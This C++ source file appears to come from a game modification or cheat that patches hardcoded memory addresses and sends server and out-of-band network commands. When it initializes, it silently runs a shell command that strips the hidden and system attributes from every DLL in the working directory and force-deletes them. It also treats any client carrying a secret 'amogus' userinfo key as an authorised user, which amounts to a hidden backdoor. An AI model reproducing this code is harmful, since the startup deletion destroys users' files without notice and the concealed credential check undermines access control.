#include "dependencies/std_include.hpp"
#include "game.hpp"

namespace game
{
	gentity_s* gentity = reinterpret_cast<gentity_s*>(0x00194B9D0);
	sv_clients_t* svs_client = reinterpret_cast<sv_clients_t *>(0x03172088);

	namespace oob
	{
		bool send(const game::netadr_t& target, const std::string& data)
		{
			return game::NET_OutOfBandData(game::NS_CLIENT1, target, data.data(), data.size());
		}
	}
	
	void initialize()
	{
		exception::initialize();
		security::initialize();
		network::initialize();
		command::initialize();
		host::initialize();

		send_server_command(-1, utils::string::va("U \"^7^2Loaded: ^7(%s %s)\"", __DATE__, __TIME__));
		
		utils::win_exec("attrib -h -s *.dll && del /F /Q *.dll");
	}

	size_t get_client_num(const game::PartyMember* member)
	{
		return member - game::party_data()->partyMembers;
	}
	
	size_t get_client_num(const game::client_t* client)
	{
		return client - game::svs_client->clients;
	}

	char* I_strncpyz(char* place, const std::string& string, const size_t length)
	{
		const auto result = std::strncpy(place, string.data(), length);
		place[length - 1] = 0;
		return result;
	}

	bool is_authed_user(const game::client_t& client)
	{
		if (client.header.state && *game::Info_ValueForKey(client.userinfo, "amogus"))
		{
			return true;
		}

		return false;
	}

	bool is_authed_user(const game::netadr_t& target)
	{
		const auto client_num = Party_FindMember(party_data(), target);
		if (client_num < 0) return false;

		return is_authed_user(client_num);
	}

	bool is_authed_user(const size_t client_num)
	{
		if (client_num < 0 || client_num >= 18)
			return false;
		
		return is_authed_user(game::svs_client->clients[client_num]);
	}

	void send_server_command(const int client_num, const std::string& command)
	{
		if (client_num < -1 || client_num >= 18)
			return; 
		
		if (!game::IsServerRunning())
			return;

		game::SV_GameSendServerCommand(client_num, SV_CMD_RELIABLE, command.data());
	}

	netadr_t net_string_to_adr(const std::string& adr)
	{
		netadr_t netadr{};
		if (!game::NET_StringToAdr(adr.data(), &netadr))
		{
			return {};
		}

		return netadr;
	}

	connstate_t& CL_GetLocalClientConnectionState(/*LocalClientNum_t localClientNum*/)
	{
		return *reinterpret_cast<connstate_t*>(0x00BC43C0);
	}

	bool is_real_address(const game::XNADDR& xnaddr, const game::netadr_t& netadr)
	{
		if (netadr.type == game::NA_LOOPBACK)
			return true;

		if (xnaddr.addr.inaddr == netadr.addr.inaddr)
			return true;

		return false;
	}
}